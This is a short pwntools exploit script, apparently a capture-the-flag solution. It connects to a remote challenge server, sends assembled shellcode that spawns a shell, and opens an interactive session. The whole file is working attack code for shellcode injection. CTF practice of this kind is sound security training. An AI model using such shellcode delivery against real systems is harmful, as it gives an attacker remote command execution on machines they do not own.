from pwn import *
context.arch = 'amd64'

r = remote('node3.buuoj.cn', 27393)

r.recvline()
r.sendline(asm(shellcraft.sh()))
r.interactive()
